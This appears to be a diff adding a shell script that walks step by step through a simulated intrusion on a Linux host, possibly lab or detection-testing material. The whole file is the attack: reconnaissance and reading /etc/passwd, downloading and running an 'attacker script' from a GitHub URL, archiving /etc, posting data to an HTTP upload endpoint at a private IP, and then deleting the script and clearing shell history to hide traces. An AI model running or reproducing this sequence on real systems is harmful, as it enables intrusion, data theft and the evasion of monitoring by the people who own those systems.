@@ -1,0 +1,95 @@
+# -------------------------------
+
+whoami
+uname -a
+pwd
+ls
+
+# -------------------------------
+
+# 3. Explore system
+
+# -------------------------------
+
+cd /etc
+ls
+cat passwd
+
+cd /home
+ls
+
+# -------------------------------
+
+# 4. System enumeration
+
+# -------------------------------
+
+ps
+netstat
+
+# -------------------------------
+
+# 5. Download attacker script
+
+# -------------------------------
+
+curl -O https://github.com/Dineshwer/temp/connect.sh
+
+# Verify download (should show connect.sh)
+
+ls
+
+# -------------------------------
+
+# 6. Prepare script
+
+# -------------------------------
+
+chmod +x connect.sh
+
+# -------------------------------
+
+# 7. Execute payload
+
+# (Simulates data collection + exfiltration)
+
+# -------------------------------
+
+./connect.sh
+
+# -------------------------------
+
+# 8. Manual data collection
+
+# -------------------------------
+
+tar -czf data.tar.gz /etc
+
+# Verify archive creation
+
+ls
+
+# -------------------------------
+
+# 9. Data exfiltration
+
+# -------------------------------
+
+curl -X POST http://192.168.1.100:8080/upload
+
+# -------------------------------
+
+# 10. Cleanup (attacker hides traces)
+
+# -------------------------------
+
+rm -f connect.sh
+history -c
+
+# -------------------------------
+
+# 11. Exit session
+
+# -------------------------------
+
+exit
